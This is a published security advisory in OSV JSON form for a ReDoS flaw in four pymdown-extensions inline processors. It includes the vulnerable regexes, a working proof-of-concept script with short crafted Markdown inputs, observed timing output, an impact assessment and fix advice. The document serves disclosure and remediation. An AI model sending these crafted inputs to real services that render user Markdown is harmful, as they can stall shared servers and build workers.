@@ -1,0 +1,183 @@
+{
+  "id": "PYSEC-2026-3654",
+  "modified": "2026-08-10T11:30:11.950190497Z",
+  "published": "2026-08-10T10:43:51.576444Z",
+  "aliases": [
+    "CVE-2026-67422",
+    "GHSA-gm37-52c6-37mw"
+  ],
+  "summary": "pymdown-extensions: exponential-backtracking ReDoS in caret, tilde, betterem, and magiclink inline processors",
+  "details": "### Summary\n\nFour inline processors in pymdown-extensions contain regular expressions with\nexponential backtracking. A single untrusted Markdown line under\n50 bytes drives `markdown.markdown()` into unbounded CPU on the rendering thread\n(seconds at ~45 bytes, growing exponentially with each added character). All four\nfire in the extension's **default configuration**\nand are reachable through the documented public API. The `caret`/`tilde`/\n`betterem` blow-up was introduced by the emphasis-pattern rewrite in PR #2547\n(first released in **10.13**, Dec 2024) — earlier releases used a linear\n`(.+?)` / `([^\\s]+?)` content group — and is present through **11.0** (latest);\n`magiclink`'s host pattern is long-standing and affects effectively all releases.\nLikely **CWE-1333 (Inefficient Regular Expression Complexity)**.\n\nThis is a distinct issue from CVE-2025-68142 (ReDoS in `pymdownx.blocks.caption`,\n`RE_FIG_NUM`, fixed in 10.16.1): different extensions, different regexes, and a\ndifferent root cause (delimiter-run partition ambiguity rather than a `.`/`\\.`\ntypo).\n\n### Details\n\nFour regexes share, or closely mirror, a vulnerable shape — an inner group that\ncan partition a run of the delimiter character into `{2,}`-sized pieces in\nexponentially many ways, wrapped in a lazy `+?` that must fail before the engine\ncan give up:\n\n| Extension | Regex | Location (`11.0`) |\n|---|---|---|\n| `pymdownx.caret` (superscript `^…^`) | `SUP2` | `pymdownx/caret.py:56` |\n| `pymdownx.tilde` (subscript `~…~`) | `SUB2` | `pymdownx/tilde.py:55` |\n| `pymdownx.betterem` (underscore `_…_`) | `SMART_UNDER_EM2` (default) | `pymdownx/betterem.py:93` |\n| `pymdownx.magiclink` (bare-URL autolink) | `RE_LINK` | `pymdownx/magiclink.py:56` (host at `:59`) |\n\n`pymdownx/caret.py:56` (`pymdown-extensions 11.0`):\n\n```python\nSUP2 = r'(?\u003c!\\^)(\\^)(?![\\^\\s])((?:[^\\^\\s]|\\^{2,})+?)(?\u003c![\\^\\s])(\\^)(?!\\^)'\n```\n\nThe content group `(?:[^\\^\\s]|\\^{2,})+?` matches a run of carets only via the\n`\\^{2,}` branch. A run of *k* carets can be split into ≥2-length pieces in\nexponentially many combinations; when no caret can serve as a valid closing\ndelimiter (the trailing `(?\u003c![\\^\\s])(\\^)` cannot be satisfied), the engine\nexplores every partition before failing. `SUB2` (tilde) and `SMART_UNDER_EM2`\n(betterem) are the same construct for `~` and `_`. In `betterem` the default\n`smart_enable='underscore'` routes underscores to `SmartUnderscoreProcessor` →\n`SMART_UNDER_EM2` (`betterem.py:93`), which is the default-reachable,\nAPI-exploitable pattern; the non-smart `UNDER_EM2` (`:69`, used only when\n`smart_enable` is `asterisk`/`disable`) shares the shape but did not reproduce\nthrough the public `markdown.markdown()` pipeline on the tested payload, so a fix\nand regression test should target `SMART_UNDER_EM2`.\n\n`pymdownx/magiclink.py:59` has the analogous ambiguity in the host portion, where\noverlapping character classes let a run of dots be grouped exponentially:\n\n```python\n(?:ht|f)tps?://[^_\\W][-\\w]*(?:\\.[-\\w.]+)*    # host: '\\.' and '[-\\w.]' inside (?:...)* both match '.'\n```\n\n`SUP2`/`SUB2`/`SMART_UNDER_EM2` are applied at each delimiter occurrence via the\ndefault `PatternSequenceProcessor` subclasses (`pymdownx/util.py`); `RE_LINK` is\napplied by `MagiclinkPattern` (registered unconditionally at priority 85). In all\nfour cases, rendering `markdown.markdown(src, extensions=[ext])` on untrusted\n`src` in default configuration is sufficient to reach the regex.\n\n### PoC\n\nSingle self-contained script; runs against the pinned release in an ephemeral\nenv. Non-destructive — the input is ordinary Markdown text; the impact is CPU/time\n(a per-render alarm caps each attempt so the script terminates).\n\n```python\nimport signal\nimport time\nfrom importlib.metadata import version\n\nimport markdown\n\nprint(f\"# pymdown-extensions {version('pymdown-extensions')} / markdown {version('markdown')}\")\n\nCAP = 5.0  # a single render exceeding this is treated as a hang\n\n\nclass Timeout(Exception):\n    pass\n\n\ndef render(ext, text):\n    signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(Timeout()))\n    signal.setitimer(signal.ITIMER_REAL, CAP)\n    t = time.perf_counter()\n    try:\n        markdown.markdown(text, extensions=[ext])\n        return time.perf_counter() - t\n    except Timeout:\n        return None\n    finally:\n        signal.setitimer(signal.ITIMER_REAL, 0)\n\n\n# ext -\u003e (malicious builder, benign builder [valid \u0026 closed], ramp, hang count)\nCASES = {\n    \"pymdownx.caret\":     (lambda n: \"^a\" + \"^\" * n + \"b\",       lambda n: \"^\" + \"a\" * n + \"^\",           [24, 30, 36], 44),\n    \"pymdownx.tilde\":     (lambda n: \"~a\" + \"~\" * n + \"b\",       lambda n: \"~\" + \"a\" * n + \"~\",           [24, 30, 36], 44),\n    \"pymdownx.betterem\":  (lambda n: \"_a\" + \"_\" * n + \"b\",       lambda n: \"_\" + \"a\" * n + \"_\",           [24, 30, 36], 44),\n    \"pymdownx.magiclink\": (lambda n: \"http://a\" + \".\" * n + \" \", lambda n: \"http://\" + \"a\" * n + \".com \", [28, 32, 36], 40),\n}\n\nrepro = []\nfor ext, (evil, benign, ramp, hang) in CASES.items():\n    base_txt = benign(hang)  # valid, closed run: same regex machinery, but linear\n    base = render(ext, base_txt)\n    print(f\"\\n[{ext}]  benign baseline (len {len(base_txt)}, valid+closed): {base * 1e3:.3f} ms\")\n    prev = None\n    for n in ramp:\n        txt = evil(n)\n        dt = render(ext, txt)\n        ratio = f\"  (x{dt / prev:.1f})\" if (prev and dt) else \"\"\n        shown = f\"{dt:8.3f} s\" if dt is not None else f\"\u003e {CAP:.0f} s (HANG)\"\n        print(f\"          malicious len {len(txt):3d}: {shown}{ratio}\")\n        prev = dt\n    txt = evil(hang)\n    dt = render(ext, txt)\n    hung = dt is None\n    print(f\"          malicious len {len(txt):3d}: \"\n          f\"{'\u003e %.0f s (HANG)' % CAP if hung else '%.3f s' % dt}\")\n    ok = base \u003c 0.05 and (hung or dt \u003e 1.0)\n    repro.append(ok)\n    print(f\"          =\u003e {'REPRODUCED' if ok else 'not reproduced'}: a {len(txt)}-byte \"\n          f\"malicious line stalls the renderer; a valid {len(base_txt)}-byte line is instant.\")\n\nassert all(repro), \"not reproduced\"\nprint(\"\\nVERDICT: exponential ReDoS reproduced in all four extensions via the \"\n      \"public markdown.markdown() API, default config (each \u003c 50-byte input).\")\n```\n\nRun:\n\n```bash\nuv run --with pymdown-extensions==11.0 --with markdown==3.10.2 python poc.py\n```\n\nThe bug is in pymdown-extensions' own regexes run by the stdlib `re` engine, so it\nis independent of the Markdown library version (`markdown` pinned only for\nbyte-exact output). Observed output:\n\n```\n# pymdown-extensions 11.0 / markdown 3.10.2\n\n[pymdownx.caret]  benign baseline (len 46, valid+closed): 11.768 ms\n          malicious len  27:    0.003 s\n          malicious len  33:    0.054 s  (x16.6)\n          malicious len  39:    0.946 s  (x17.6)\n          malicious len  47: \u003e 5 s (HANG)\n          =\u003e REPRODUCED: a 47-byte malicious line stalls the renderer; a valid 46-byte line is instant.\n\n[pymdownx.tilde]  benign baseline (len 46, valid+closed): 5.364 ms\n          malicious len  27:    0.003 s\n          malicious len  33:    0.053 s  (x17.1)\n          malicious len  39:    0.962 s  (x18.2)\n          malicious len  47: \u003e 5 s (HANG)\n          =\u003e REPRODUCED: a 47-byte malicious line stalls the renderer; a valid 46-byte line is instant.\n\n[pymdownx.betterem]  benign baseline (len 46, valid+closed): 3.167 ms\n          malicious len  27:    0.003 s\n          malicious len  33:    0.052 s  (x17.1)\n          malicious len  39:    0.948 s  (x18.1)\n          malicious len  47: \u003e 5 s (HANG)\n          =\u003e REPRODUCED: a 47-byte malicious line stalls the renderer; a valid 46-byte line is instant.\n\n[pymdownx.magiclink]  benign baseline (len 52, valid+closed): 4.935 ms\n          malicious len  37:    0.033 s\n          malicious len  41:    0.210 s  (x6.4)\n          malicious len  45:    1.405 s  (x6.7)\n          malicious len  49: \u003e 5 s (HANG)\n          =\u003e REPRODUCED: a 49-byte malicious line stalls the renderer; a valid 52-byte line is instant.\n\nVERDICT: exponential ReDoS reproduced in all four extensions via the public markdown.markdown() API, default config (each \u003c 50-byte input).\n```\n\nThe per-step ratio stays roughly constant as the run grows (a fixed multiplicative\nfactor per fixed-size increment) — the signature of exponential, not polynomial,\nbacktracking. A valid, closed delimiter run of the same length exercises the same\nregex yet renders in well under a millisecond, isolating the cost to the *unclosed*\ncrafted run. Extending it a few more characters pushes the render time into minutes\nand beyond.\n\n### Impact\n\nDenial of service: a sub-50-byte line pins the rendering thread at 100% CPU, with\nno memory pressure to trip an OOM killer. Most Material/MkDocs usage renders\ntrusted author content at build time, but the untrusted-input exposure is concrete\nin two settings:\n\n- General Python web apps that render user-supplied Markdown (comments, wikis,\n  issue/ticket bodies, chat, live preview) — notably any app using\n  `pymdownx.extra`, which bundles `betterem` with the vulnerable default\n  `smart_enable='underscore'`, or that reuses a Material-style extension block in\n  a runtime renderer.\n- Hosted docs/CI systems that build untrusted, user-contributed Markdown, where a\n  single crafted line hangs the shared build worker.\n\n- Attacker: unauthenticated, remote (anyone who can submit Markdown).\n- Configuration: **default** for each extension.\n- Proposed **CWE-1333**. Proposed CVSS 3.1 (as proposed — the maintainer makes\n  the final call): `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (7.5, High).\n\n### Suggestion\n\nThe vulnerable content groups need to be rewritten so a delimiter run has exactly\none parse, removing the `{2,}` partition ambiguity that lets the engine\nre-segment a run on backtracking. For the emphasis patterns, restructuring the\ncontent so a delimiter run is consumed in a single, non-re-partitionable way\n(rather than by a `{2,}` branch inside a `+?` group) removes the blow-up; for\n`RE_LINK`, disambiguate the host so `.` is matched in exactly one place (a single\nlabelled-host pattern such as `(?:[-\\w]+)(?:\\.[-\\w]+)*`) rather than by\noverlapping classes. Possessive quantifiers / atomic groups are the most direct\ntool but require Python 3.11+; since the project supports Python 3.10, a\nstructural rewrite is the portable option.\n\nA regression fixture per extension (a short delimiter run with no valid closer,\nasserted to render under a small time budget) would guard against reintroduction.\n\n### References\n\n- Affected source (`pymdown-extensions 11.0`): `pymdownx/caret.py:56` (`SUP2`),\n  `pymdownx/tilde.py:55` (`SUB2`), `pymdownx/betterem.py:93` (`SMART_UNDER_EM2`,\n  default; `:69` `UNDER_EM2` shares the shape), `pymdownx/magiclink.py:56`\n  (`RE_LINK`, host subexpression at `:59`).\n- Novelty: same class as CVE-2025-68142 (`pymdownx.blocks.caption` `RE_FIG_NUM`,\n  fixed 10.16.1) but distinct extensions, regexes, and root cause. The\n  `caret`/`tilde`/`betterem` content groups gained the vulnerable `{2,}`\n  alternation in PR #2547 (v10.13); earlier releases used a linear\n  `(.+?)` / `([^\\s]+?)` group. `magiclink`'s host pattern is long-standing. None\n  of the four has been touched by a prior security fix; all are present in the\n  latest release (11.0).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pymdown-extensions",
+        "purl": "pkg:pypi/pymdown-extensions"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "11.0.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0.0",
+        "1.0.1",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "10.0",
+        "10.0.1",
+        "10.1",
+        "10.10",
+        "10.10.1",
+        "10.10.2",
+        "10.11",
+        "10.11.1",
+        "10.11.2",
+        "10.12",
+        "10.13",
+        "10.14",
+        "10.14.1",
+        "10.14.2",
+        "10.14.3",
+        "10.15",
+        "10.16",
+        "10.16.1",
+        "10.17",
+        "10.17.1",
+        "10.17.2",
+        "10.18",
+        "10.19",
+        "10.19.1",
+        "10.2",
+        "10.2.1",
+        "10.20",
+        "10.20.1",
+        "10.21",
+        "10.21.2",
+        "10.21.3",
+        "10.3",
+        "10.3.1",
+        "10.4",
+        "10.5",
+        "10.6",
+        "10.7",
+        "10.7.1",
+        "10.8",
+        "10.8.1",
+        "10.9",
+        "11.0",
+        "2.0",
+        "3.0",
+        "3.1",
+        "3.2",
+        "3.2.1",
+        "3.3",
+        "3.4",
+        "3.5",
+        "4.0",
+        "4.1",
+        "4.10",
+        "4.10.1",
+        "4.10.2",
+        "4.11",
+        "4.12",
+        "4.2",
+        "4.3",
+        "4.4",
+        "4.5",
+        "4.5.1",
+        "4.6",
+        "4.7",
+        "4.8",
+        "4.9",
+        "4.9.1",
+        "4.9.2",
+        "5.0",
+        "6.0",
+        "6.1",
+        "6.2",
+        "6.2.1",
+        "6.3",
+        "7.0",
+        "7.0b1",
+        "7.0b2",
+        "7.0rc1",
+        "7.0rc2",
+        "7.1",
+        "8.0",
+        "8.0.1",
+        "8.1",
+        "8.1.1",
+        "8.2",
+        "9.0",
+        "9.0.dev0",
+        "9.1",
+        "9.10",
+        "9.10a1",
+        "9.10a2",
+        "9.10a3",
+        "9.10b1",
+        "9.10b2",
+        "9.10b3",
+        "9.10b4",
+        "9.10b5",
+        "9.11",
+        "9.2",
+        "9.3",
+        "9.4",
+        "9.5",
+        "9.6",
+        "9.7",
+        "9.8",
+        "9.9",
+        "9.9.1",
+        "9.9.2"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pymdown-extensions/PYSEC-2026-3654.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-gm37-52c6-37mw"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67422"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/pymdown-extensions/commit/c68498598d7b13011bb4571350b6e3612a4ce44b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/facelessuser/pymdown-extensions"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/pymdown-extensions"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-gm37-52c6-37mw"
+    }
+  ]
+}
